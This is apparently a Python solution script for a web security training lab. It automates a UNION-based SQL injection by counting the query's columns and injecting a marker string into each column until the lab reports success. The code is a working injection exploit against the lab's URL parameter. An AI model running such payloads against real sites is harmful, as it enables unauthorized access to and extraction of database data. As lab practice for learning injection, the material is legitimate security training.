# For this Lab, we need to make the string 'eoJBOB' appear in the list of results. 
# This is a very simple task since we can use the select clause to directly create the 'eoJBOB' string and return it. 
# The challenge is to find which column we can input the string in. 
# For that, we find the number of columns that the initial query is returning.
# We iterate over each column and determine the type by checking if an error occurs we we input a specific typed element. 

import requests
from proxies import proxies
from sqli_utils import sqli_count_columns
import json

def solve(url: str, payload: str):
    r = requests.session()
    col_count = sqli_count_columns(r, url)
    
    lab_solve_string = "'{}'".format(payload)
    for i in range(0, col_count):
        tmp = ["NULL" if i != j else lab_solve_string for j in range(0, col_count)]
        payload = "'+union+select+" + ",+".join(tmp) + "--"
        print("[~] Testing Payload: " + payload)

        res = r.get(url + payload, verify=False, proxies=proxies)
        
        if "Congratulations, you solved the lab!" in res.text:
            print("[+] ================================")
            print("[+] Injected payload: " + payload + "--")
            return True

    return False
